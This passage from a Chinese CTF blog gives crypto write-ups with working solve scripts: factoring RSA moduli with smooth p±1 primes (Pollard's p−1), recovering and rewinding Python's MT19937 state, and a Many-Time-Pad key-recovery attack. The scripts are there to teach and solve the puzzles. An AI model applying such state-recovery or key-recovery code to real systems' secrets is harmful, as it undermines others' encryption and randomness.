class="string">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>终于来了</p>
<p>先看三个素数，这里出题人狡诈，p是用题目中的getprime函数得出来的，q和r则是用Crypto库中的getPrime得到的</p>
<p>所以看函数就知道，p+1可以很好地得到分解</p>
<p>我们求解的步奏一步步反推回去应该是这样</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706161649767.png" alt="image-20210706161649767" style="zoom: 67%;" />

<p>必须知道p和q，然后求出r</p>
<p>好吧，不会了，用之前看到的分解去试试</p>
<p>竟然！被同样的招式打败了。应该也是出题人使然</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162410515.png" alt="image-20210706162410515"></p>
<p>但p确实满足上述性质</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162852340.png" alt="image-20210706162852340"></p>
<p>那就先按照上面的流程写脚本吧</p>
<p>在最后一个箭头处，由于算来的c是512位的，所以不能对c进行直接开方；那么rabin攻击呢，模数是一个质数；终于，被老师催更无数，<strong>平方根算法</strong>登场，网上看到的一些jo本大多都是基于这个算法的实现的</p>
<blockquote>
<p>脚本编写</p>
</blockquote>
<p>emmmmm时间来不及了，先用下库函数了，后续再补充，老师等我</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">n = <span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">d = <span class="number">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line">cipher = <span class="number">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393</span></span><br><span class="line">q = <span class="number">7534810196420932552168708937019691994681052660068275906973480617604535381306041583841106383688654426129050931519275383386503174076258645141589911492908993</span></span><br><span class="line">r = <span class="number">10269028767754306217563721664976261924407940883784193817786660413744866184645984238866463711873380072803747092361041245422348883639933712733051005791543841</span></span><br><span class="line"><span class="keyword">assert</span> d == invert(q**<span class="number">2</span>, p**<span class="number">2</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(cipher, d, n)</span><br><span class="line"><span class="comment"># print(c.bit_length())</span></span><br><span class="line"><span class="comment"># 512</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment"># c = 8081092455112516397361105816900490085355315574087538340788309885334106796325593823678787887569920404814986643819898763828872716522338864714182757065213683</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(nthroot_mod(c, <span class="number">2</span>, r)))</span><br></pre></td></tr></table></figure>

<h4 id="光滑数"><a href="#光滑数" class="headerlink" title="光滑数"></a>光滑数</h4><p>之前就想整理Crypto中关于光滑数的考点</p>
<p>所谓光滑数就是：<strong>是一个可以因数分解为小素数乘积的正整数</strong></p>
<p>然后有两个算法可以分解，一是这道题讲的<a href="https://en.wikipedia.org/wiki/Williams'_p_%2B_1_algorithm">Williams’p+1 algorithm</a>，还有一种是解减一是光滑数的<a href="https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm">Pollard’s p−1 algorithm</a>，可以使用这个python的包来解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=p-1 XXXXX</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=+1 XXXXXX</span><br></pre></td></tr></table></figure>

<p>来道题</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myPrime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p = myPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 1224542620373200232525165378018470774334801515191193204875465445916504222883935188890019876845076388385357911730689547124547346252951158814249284724565588433721828377715469374541007756509231399263095022024229078845538543233785364809917406108015271780070196140628158427541531563472532516237632553353655535922926443707617182025475004547531104052989085765070550150028833424395972178427807901747932614235844448614858629761183210600428438018388051958214596857405813088470933109693499438012040822262549119751099008671892966082341548512112435591881692782766559736840448702039918465573051130405935280702181505538733234675792472428666968900055706926735800561218167237812066851519973807203332801575980055838563085817664973968944323258406789203078387708964307931318918136664885818917720073433998810127482159223895026085726623747340692196977140382318293090736558135980651252533606603312148824142669800602887109353065489282386215179238458743567166284295855288783740314247952124965482197632971993708775190564519250754150756867653033527903848903210074426177258586450311109023467944412194124015505951966140443860862968311560843608415723549525497729679097936310538451467530605937684408079363677707513923579164067808729408365886209340192468399685190639</span></span><br><span class="line"><span class="comment"># c = 145742860621666495489510776707734134231023214235535481878205099324276369445463746101469487674333600296204530932386373415987357363515200117271393133347844479863240936801112306080456942844796779477817786176831015954410967693647534326733641573842953783193563678040093734579772976410574013857063137696465850300484753282472377882118892522844694078667622111244886303620349388556315704648609353412177123230438077637042880490566244740468503369707900343076369151796123461132932226563486870411965536062339169788331659119981901553536009275158600580698576110294775989992794065611215170351808698605911258789407992833170968332058255364527244293283228694886707241979238145252395651417561576433516407782575454294499521347378058366557950770592472271985004818847838711060048422015207674862177145761946560579360220239667890707135827136815780729363013864130107808776517514214310689477005999830284272130148939734935547341627208913181919190392205389452185597444280635342938046191904062547803917870268485346888653569349729643793041018550170090471310374856687407102762116819004790791936814214507908374380597027347007448114684844276041116955473180015221164545212550832233007714133699817366745648092776901013502840540012912660742166994968977400188176557657864</span></span><br></pre></td></tr></table></figure>

<p>显然p是n-1类型的光滑数，但是直接食用工具，效果不佳；再次确认，前面的两题是出题人有意为之</p>
<p>所以跟着CSDN大佬来看下Pollard’s p−1算法的食用方法</p>
<blockquote>
<p>推导步奏</p>
</blockquote>
<p>目标很明确，通过p分解n</p>
<p>所谓的Pollard’s p−1算法就是<br>如果p-1是光滑数，那么n!就能被p-1整除，即n!=t(p-1)<br>对于n=2,3,4,…，只要<br>$$<br>gcd(2^{n!}-1, N)\neq 1和N<br>$$<br>就成功分解N了<br>以上算法适用于p是N的因数，且p-1是光滑数</p>
<p>当然求n的阶乘是个耗费资源的事情，所以我们对递归式子精心简化，这样就不用重复计算了<br>$$<br>2^{n!}\ mod\ N=(2^{(n-1)!}\ mod\ N)^{n}\ mod\ N<br>$$</p>
<p>而由我们熟悉的费马定理可以推出<br>$$<br>2^{t(p-1)}\equiv 1\ mod\ p<br>$$<br>改写成等式<br>$$<br>2^{t(p-1)}-1=kp<br>$$<br>所以$2^{t(p-1)}-1$是p的倍数，结合前面推出的，我们得到的结论是<br>$$<br>2^{n!}-1=kp<br>$$<br><strong>通过枚举n求kp，求kp和N的公因子就是p</strong></p>
<p>也没看得特别懂，最后得到的递推式子是<br>$$<br>2^{n!}\ mod\ N=<br>\begin{cases}<br>2^2\ mod\ N&amp; {n=2}\\<br>(2^{(n-1)!}\ mod\ N)^n\ mod\ N&amp; {n \geq 3}<br>\end{cases}<br>$$</p>
<p>抄了别人这么多了，自己实现一下代码</p>
<p>感觉被套路了，还是自己算法到代码的能力太差；最后写出来的脚本是这样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_p_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    i = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a-<span class="number">1</span>, n) == <span class="number">1</span> <span class="keyword">or</span> gcd(a-<span class="number">1</span>, n) == n:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, i, n)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">return</span> gcd(a-<span class="number">1</span>, n)</span><br></pre></td></tr></table></figure>

<p>要跑挺久的，虽然也才十几万次</p>
<p>最后得到的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Pollard_s_p-1_&amp;_William_s_p+1&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><blockquote>
<p> 题目描述</p>
</blockquote>
<p>Can you trace back to the past?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env/python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        f.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目名为回溯</p>
<p>妥妥的MT19937，好在之前做过；它有一千个随机数，需要找到这一千个随机数的前面一个</p>
<p>问题来了，之前GKCTF做到的，以及之前类似的题目都是预测之后的随机数，那么要反过来，预测之前的那应该怎么做呢？</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221554229.png" alt="image-20210706221554229"></p>
<p>别急，大佬还是有解法，贴下连接这里直接抄脚本了，后续研究</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="comment"># right shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># right shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp&gt;&gt;shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span>(<span class="params">cur</span>):</span></span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i+<span class="number">624</span>]^state[i+<span class="number">397</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>+<span class="number">624</span>]^state[i+<span class="number">396</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_state</span>(<span class="params">out</span>):</span></span><br><span class="line">    state = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">        i = inverse_right(i,<span class="number">18</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">15</span>,<span class="number">0xefc60000</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">7</span>,<span class="number">0x9d2c5680</span>)</span><br><span class="line">        i = inverse_right(i,<span class="number">11</span>)</span><br><span class="line">        state.append(i)</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;../output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(f[i].strip()))</span><br><span class="line"></span><br><span class="line">partS = recover_state(c)</span><br><span class="line">state = backtrace([<span class="number">0</span>]*<span class="number">4</span>+partS)[:<span class="number">624</span>]</span><br><span class="line"><span class="comment"># print(state)</span></span><br><span class="line">prng = Random()</span><br><span class="line">prng.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(prng.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<hr>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221821180.png" alt="image-20210706221821180"></p>
<p>你说说你还有什么用，只会抄WP</p>
<p>花了两天，算是过了一遍，但是越到后面，研究的劲头就越低，很多资料还是要消化成自己的东西</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>光滑数</tag>
      </tags>
  </entry>
  <entry>
    <title>20210527 MTCTF2021Crypto方向部分复现</title>
    <url>/posts/43deb916/</url>
    <content><![CDATA[<img alt="easy_RSA-37a4a203.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easy_RSA-37a4a203.png" width="" height="" >

<p>看了下日期，又不能快乐地刷题了</p>
<p>那天竟然被宁波的比赛耽误，SSGYZTL，错过了美团，赛后复现一下</p>
<span id="more"></span>

<h1 id="20210527-MTCTF2021Crypto方向部分复现"><a href="#20210527-MTCTF2021Crypto方向部分复现" class="headerlink" title="20210527 MTCTF2021Crypto方向部分复现"></a>20210527 MTCTF2021Crypto方向部分复现</h1><h2 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h2><p>第一层套了一个padding，比较常规不再赘述</p>
<p>第二层是多次一加密（Many Time Pad），大致的加密思路就是每次都用相同的key去加密明文，注意一次一密（One Time Pad）的区别</p>
<h3 id="第二层的题目描述"><a href="#第二层的题目描述" class="headerlink" title="第二层的题目描述"></a>第二层的题目描述</h3><p>输入第一层的密码，压缩包文件里的内容是这样的，有十二个十六进制的数字</p>
<img alt="easy_RSA-a8cb1b59.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easy_RSA-a8cb1b59.png" width="" height="" style="zoom:67%;"  >

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>话不多说，直接去找脚本，大致的思路是按照这位师傅的博客<a href="https://www.ruanx.net/many-time-pad/">https://www.ruanx.net/many-time-pad/</a>来的，讲得太好了</p>
<p>主要就是两个密文异或，可以把相同的key去掉，这样就相当于两个明文异或了<br>（这里注意尽管OTP的安全系数相当高，但是由于密码分发的问题，难以实现，所以这里当成MTP来做了）</p>
<p>至于攻击的手段，时间有限先不展开；有了脚本之后，并不代表一切的终结，我们还需要做一下操作</p>
<h3 id="脚本改编"><a href="#脚本改编" class="headerlink" title="脚本改编"></a>脚本改编</h3><p>首先当然是把读文件里的文件名换一下啦，注意最好删去逗号</p>
<p>然后直接运行会报错，因为密文不等长，可以先把第六和第十二个密文填充和其他密文等长的长度</p>
<p>第一次运行结果是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N=w -ou need to u&#125;e the k3</span><br><span class="line">o%n 2lag as the kky of On8</span><br><span class="line"> im1 Pad Encryptgn. Now )</span><br><span class="line">h3t -ou have passkd the p/</span><br><span class="line">e$io!s RSA test, zhis cha1</span><br><span class="line">l7ng1 is not partgcularly</span><br><span class="line">p&gt;ea&#x27;e get the tr&#123;e messa:</span><br><span class="line">d;ff=cult for you  It is 7</span><br><span class="line">u!t &#x27;imple encrypzion.I h2</span><br><span class="line">p7 y;u can solve zhis pro?</span><br><span class="line">l7m %uickly and gkt the c2</span><br><span class="line">r ec  answer succksslyp@d</span><br><span class="line">b&#x27;f&gt;ag/it_1s_P@dd1nQ@nd_p@d &#x27;</span><br></pre></td></tr></table></figure>

<p>（？？？小朋友你是不是有很多问号）</p>
<p>为什么会出现乱码和明文混合的现象呢，这个要和攻击的原理挂钩，暂时也不展开</p>
<p>而我们所要做的第二步就是愉快的猜字母环节，将很明显错地方的字母给替换成对的，替换的函数师傅已经写好了，直接用就好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span class="string">&#x27;e&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后运行得到完整的明文和flag，至于之前的在末尾填充0，也是试出来</p>
<p>贴一下完整脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ischr</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">infer</span>(<span class="params">p_index, p_pos</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg[p_index, p_pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_space</span>():</span></span><br><span class="line">    <span class="keyword">for</span> t_index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x != y]</span><br><span class="line">        f = <span class="keyword">lambda</span> t_pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(ischr, [s[t_pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(t_pos) <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> t_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(t_pos), t_index, t_pos))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第十二行和第六行长度不一，末尾填充0就好了</span></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;t3mpt.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">get_space()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">know</span>(<span class="params">p_index, p_pos, ch</span>):</span></span><br><span class="line">    msg[p_index, p_pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != p_index:</span><br><span class="line">            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要手动更改的就是这个地方，按照意思，替换你确定的字母</span></span><br><span class="line">know(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">13</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">17</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">19</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">25</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其实只需要知道一条正确的明文就够了，key=C1^M1</span></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure>

